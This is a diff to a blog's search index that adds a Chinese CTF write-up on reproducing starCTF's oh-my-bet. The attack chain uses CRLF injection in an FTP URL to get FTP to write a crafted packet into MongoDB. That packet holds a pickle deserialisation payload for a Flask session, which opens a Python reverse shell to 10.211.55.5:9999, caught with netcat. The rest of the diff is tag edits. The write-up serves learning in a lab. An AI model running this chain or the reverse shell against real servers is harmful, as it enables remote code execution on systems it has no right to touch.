@@ -4,6 +4,43 @@
   
   
   <entry>
+    <title>如何使用CRLF控制FTP攻击内网的mongodb来复现Flask反序列化漏洞</title>
+    <link href="/2021/02/07/2021%E5%B9%B42%E6%9C%887%E6%97%A5-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8CRLF%E6%8E%A7%E5%88%B6FTP%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E7%9A%84mongodb%E6%9D%A5%E5%A4%8D%E7%8E%B0Flask%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2021/02/07/2021%E5%B9%B42%E6%9C%887%E6%97%A5-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8CRLF%E6%8E%A7%E5%88%B6FTP%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E7%9A%84mongodb%E6%9D%A5%E5%A4%8D%E7%8E%B0Flask%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<!-- 1. 修改标题、分类、标签2. 拟写正文3. 第二天并尝试修改4. 自己阅读一遍5. 发布6. 删除注释 --><h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>最近在尝试做 starCTF 中的 oh-my-bet，需要使用 CRLF 漏洞来控制 FTP 向 mongodb 中发送数据包来修改 mongodb 中的内容。我尝试着自己手动构建了一个简易的环境来实现大致的流程。</p><h1 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2 环境搭建"></a>2 环境搭建</h1><p>使用虚拟机 + 主机两台机器来实现整个流程：</p><ol><li>宿主机（Web 服务器）</li><li>虚拟机（用来攻击的服务器）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E090DD65-02E1-4C35-8F3A-F29C686981D8.png"></li></ol><h2 id="2-1-搭建mongo环境（宿主机和虚拟机）"><a href="#2-1-搭建mongo环境（宿主机和虚拟机）" class="headerlink" title="2.1 搭建mongo环境（宿主机和虚拟机）"></a>2.1 搭建mongo环境（宿主机和虚拟机）</h2><p>在宿主机和虚拟机都需要搭建mongo环境，为了不与主机的 mongo 重合，我采用 27018 端口</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">docker run -itd --name mongo -p <span class="hljs-number">27018</span>:<span class="hljs-number">27017</span> mongo<br></code></pre></td></tr></table></figure><h2 id="2-2-flask（宿主机）"><a href="#2-2-flask（宿主机）" class="headerlink" title="2.2 flask（宿主机）"></a>2.2 flask（宿主机）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><span class="hljs-keyword">from</span> flask_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> pymongo<br><br>app = Flask(__name__)<br><br>app.debug = <span class="hljs-literal">True</span><br>app.secret_key = <span class="hljs-string">&#x27;f4545478ee86$%^&amp;&amp;%$#&#x27;</span><br>app.config[<span class="hljs-string">&#x27;SESSION_TYPE&#x27;</span>] = <span class="hljs-string">&#x27;mongodb&#x27;</span>  <span class="hljs-comment"># session 类型为 mongodb</span><br><br>app.config[<span class="hljs-string">&#x27;SESSION_MONGODB&#x27;</span>] = pymongo.MongoClient(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">27018</span>)<br>app.config[<span class="hljs-string">&#x27;SESSION_MONGODB_DB&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span><br>app.config[<span class="hljs-string">&#x27;SESSION_MONGODB_COLLECT&#x27;</span>] = <span class="hljs-string">&#x27;sessions&#x27;</span><br><br><span class="hljs-comment"># 如果设置为True，则关闭浏览器session就失效。</span><br>app.config[<span class="hljs-string">&#x27;SESSION_PERMANENT&#x27;</span>] = <span class="hljs-literal">True</span><br><span class="hljs-comment"># 是否对发送到浏览器上session的cookie值进行加密</span><br>app.config[<span class="hljs-string">&#x27;SESSION_USE_SIGNER&#x27;</span>] = <span class="hljs-literal">False</span><br><span class="hljs-comment"># 保存到session中的值的前缀</span><br>app.config[<span class="hljs-string">&#x27;SESSION_KEY_PREFIX&#x27;</span>] = <span class="hljs-string">&#x27;session:&#x27;</span><br><br>Session(app)<br><br><span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    session[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;slug01sh&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello mongo&#x27;</span><br><br><span class="hljs-meta">@app.route(&#x27;/get&#x27;)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>():</span><br>    b = session.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    <span class="hljs-keyword">return</span> b<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>这个 flask 应用共有 2 个路径 <code>/</code> 和 <code>/get</code></p><ul><li><code>/</code> 可以初始化 session</li><li><code>/get</code>可以将 session 从 mongo 中取出（会进行反序列化操作）</li></ul><p>访问 <a href="http://127.0.0.1:5000/">http://127.0.0.1:5000</a> ，查看控制台即可得到 session 为：922b2d8f-26c8-4146-8742-9d62b3988a17</p><h2 id="2-3-mongo数据包-虚拟机"><a href="#2-3-mongo数据包-虚拟机" class="headerlink" title="2.3 mongo数据包(虚拟机)"></a>2.3 mongo数据包(虚拟机)</h2><p>在虚拟机中生成 mongo 数据包，将二进制文件保存到 FTPD 的根目录下。（在这里，我缩略了一些步骤。oh-my-bet 一题中需要先把文件上传到 FTP 服务器中，并保存成文件，再发送到 mongo 中。而这里我直接生成数据包保存到 FTP 服务器中）</p><p>生成数据包之前需要先修改 pymongo 中的 <code>network.py</code> 文件，用来捕获数据包。使用下面的命令找到 pymongo 的位置。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;import pymongo;print(pymongo.__file__)&quot;</span> <br></code></pre></td></tr></table></figure><p>运行即可找到 pymongo 的路径<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E1BB5D5D-EEDA-47EF-8DA7-1B1B00C9A922.png"></p><p>使用 sendall 关键字寻找<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210207201744.png"><br>在 try 前，添加如图所示的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;session:&#x27;</span> <span class="hljs-keyword">in</span> msg:<br>    e = Exception()<br>    e.message = msg<br>    <span class="hljs-keyword">raise</span> e<br></code></pre></td></tr></table></figure><p>最后在 ftp 服务器的目录下生成 mongo 数据包（二进制文件）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pymongo <span class="hljs-keyword">import</span> MongoClient<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 构建反序列化</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_pickle</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>            <span class="hljs-keyword">return</span> (os.system, (cmd,))<br><br>    <span class="hljs-keyword">return</span> pickle.dumps(exp())<br><br><span class="hljs-comment"># 获取mongo的请求包</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_mongo</span>(<span class="hljs-params">cmd</span>):</span><br>    client = MongoClient(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">27018</span>)<br>    coll = client.admin.sessions<br>    <span class="hljs-keyword">try</span>:<br>        coll.update_one(<br>            &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;session:922b2d8f-26c8-4146-8742-9d62b3988a17&#x27;</span>&#125;,<br>            &#123;<span class="hljs-string">&quot;$set&quot;</span>: &#123;<span class="hljs-string">&quot;val&quot;</span>: get_pickle(cmd)&#125;&#125;,<br>            upsert=<span class="hljs-literal">True</span><br>        )<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> e.message<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    packet = get_mongo(<br>        cmd=<span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.5&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span>)<br><br>    print(packet)<br><br>    file = open(<span class="hljs-string">&#x27;slug01sh&#x27;</span>, <span class="hljs-string">&#x27;ab&#x27;</span>)<br>    file.write(packet)<br></code></pre></td></tr></table></figure><p>记得修改上面的session（mongo通过session来找到用户）和 cmd（反序列化时会被运行的指令）。</p><p>运行脚本生成 mongo 数据包<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1EF3510F-4CA4-4C49-AF4B-8C749E24C4CB.png"></p><h2 id="2-4-FTP服务器（虚拟机）"><a href="#2-4-FTP服务器（虚拟机）" class="headerlink" title="2.4 FTP服务器（虚拟机）"></a>2.4 FTP服务器（虚拟机）</h2><p>FTP 服务器源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer<br><span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> FTPHandler<br><span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServer<br><br>authorizer = DummyAuthorizer()<br><br>authorizer.add_user(<span class="hljs-string">&quot;fan&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>,perm=<span class="hljs-string">&quot;elrafmwMT&quot;</span>)<br>authorizer.add_anonymous(<span class="hljs-string">&quot;.&quot;</span>)<br><br>handler = FTPHandler<br>handler.permit_foreign_addresses = <span class="hljs-literal">True</span><br>handler.passive_ports = range(<span class="hljs-number">2000</span>, <span class="hljs-number">2030</span>)<br>handler.authorizer = authorizer<br><br>server = FTPServer((<span class="hljs-string">&quot;10.211.55.5&quot;</span>, <span class="hljs-number">8877</span>), handler)<br>server.serve_forever()<br><br></code></pre></td></tr></table></figure><p>运行状态：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/CB0AFCCA-C6F0-46F8-9E91-85E928A893BA.png"></p><h1 id="3-攻击"><a href="#3-攻击" class="headerlink" title="3 攻击"></a>3 攻击</h1><p>准备 CRLF 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_port_cmd</span>(<span class="hljs-params">host</span>):</span><br>    ip, port = host.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    ip = <span class="hljs-string">&#x27;,&#x27;</span>.join(ip.split(<span class="hljs-string">&#x27;.&#x27;</span>))<br>    port = int(port)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;port <span class="hljs-subst">&#123;ip&#125;</span>,<span class="hljs-subst">&#123;port // <span class="hljs-number">256</span>&#125;</span>,<span class="hljs-subst">&#123;port - port // <span class="hljs-number">256</span> * <span class="hljs-number">256</span>&#125;</span>&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 向本地的FTP发送消息</span><br>    target = <span class="hljs-string">&#x27;10.211.55.5:8877&#x27;</span><br><br>    <span class="hljs-comment"># FTP的消息</span><br>    commands = [<span class="hljs-string">&#x27;type i&#x27;</span>, get_port_cmd(host=<span class="hljs-string">&#x27;10.211.55.2:27018&#x27;</span>), <span class="hljs-string">&#x27;retr slug01sh&#x27;</span>]<br>    commands_str = <span class="hljs-string">&#x27;\r\n&#x27;</span>.join(commands)<br>    commands_str = urllib.parse.quote(commands_str)<br><br>    url = <span class="hljs-string">&#x27;ftp://fan:root@&#x27;</span>+target+<span class="hljs-string">&#x27;/\r\n&#x27;</span>+commands_str<br>    urllib.request.urlopen(url)<br></code></pre></td></tr></table></figure><p>可以运行脚本的 Python 版本：</p><ul><li>Python 3.x版本至3.7.2版本中的urllib</li></ul><p>运行CRLF代码，可以看到虚拟机中的 FTP 服务器显示发送成功<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/13FE4614-653F-4526-A188-E2722648A872.png"></p><p>使用 navicat 连接 mongo，观察集合可以发现，通过 val 的长度来判断是否被更新成功。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/5BB58490-6651-4221-B461-9FB6892B3A08.png"><br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/645A6587-FE02-40FF-8FE7-337BB8287E7B.png"></p><p>在虚拟机中使用 nc -lvp 9999 等待反弹 shell，使用浏览器访问  <a href="http://127.0.0.1:5000/get">http://127.0.0.1:5000/get</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>flask</tag>
+      
+      <tag>ssrf</tag>
+      
+      <tag>crlf</tag>
+      
+      <tag>ftp</tag>
+      
+      <tag>mongodb</tag>
+      
+      <tag>session</tag>
+      
+      <tag>unserialize</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>如何查看Docker中mongodb的内容？</title>
     <link href="/2021/02/07/2021%E5%B9%B42%E6%9C%887%E6%97%A5-%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8BDocker%E4%B8%ADmongodb%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9F/"/>
     <url>/2021/02/07/2021%E5%B9%B42%E6%9C%887%E6%97%A5-%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8BDocker%E4%B8%ADmongodb%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9F/</url>
@@ -161,9 +198,9 @@
       
       <tag>《Web安全攻防》</tag>
       
-      <tag>XSS</tag>
+      <tag>xss</tag>
       
-      <tag>CSRF</tag>
+      <tag>csrf</tag>
       
     </tags>
     
@@ -691,6 +728,12 @@
     </categories>
     
     
+    <tags>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
   </entry>
   
   
@@ -710,6 +753,12 @@
     </categories>
     
     
+    <tags>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
   </entry>
   
   
@@ -728,6 +777,12 @@
       
     </categories>
     
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+    </tags>
     
   </entry>
   
@@ -769,11 +824,11 @@
     
     <tags>
       
-      <tag>CTF</tag>
+      <tag>ctf</tag>
       
-      <tag>JWT</tag>
+      <tag>jwt</tag>
       
-      <tag>Java命令执行</tag>
+      <tag>java命令执行</tag>
       
     </tags>
     
